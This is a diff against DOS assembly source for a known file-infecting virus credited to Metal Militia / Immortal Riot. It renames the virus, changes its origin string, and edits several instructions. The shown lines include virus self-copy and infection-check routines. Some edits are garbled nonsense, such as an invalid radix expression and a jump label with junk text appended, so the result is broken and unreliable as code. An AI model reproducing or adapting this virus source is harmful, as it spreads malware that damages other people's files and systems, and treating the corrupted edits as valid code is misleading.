@@ -1,5 +1,5 @@
-; Virusname: Extasy
-; Origin: Sweden
+; Virusname: snake_rules < GW >/ bahrain
+; Origin: bahrain
 ; Author: Metal Militia
  
 ; This virus can be found with any anti-virus program, since it's been
@@ -18,7 +18,7 @@
 
           .model  tiny
           .code
-          .radix  16
+          .radix  16/12
           .code
 
   viruslength     =       heap - _small
@@ -39,7 +39,7 @@
           cmp     word ptr ds:[di+25],di
           jz      exit_small
 
-          lea     si,[bp-3]
+          lea     si,[bp-v4]
           mov     cx,viruslength
           db      2Eh
           rep     movsb
@@ -105,7 +105,8 @@
           int     21
 
           cmp     ax,cx
-          jnz     go_already_infected
+          jnz     go_already_infected_send all file open number office 1233986745093894B>H>K>L>O>P>U>V
+
 
           mov     di,offset target + startload
           push    di
@@ -133,7 +134,7 @@
           pop     cx
           jmp     short already_infected
 
-          db      "EXTASY!"
+          db      "Abdulla virus"
           db      "(c) Metal Militia / Immortal Riot"
 
   int21:
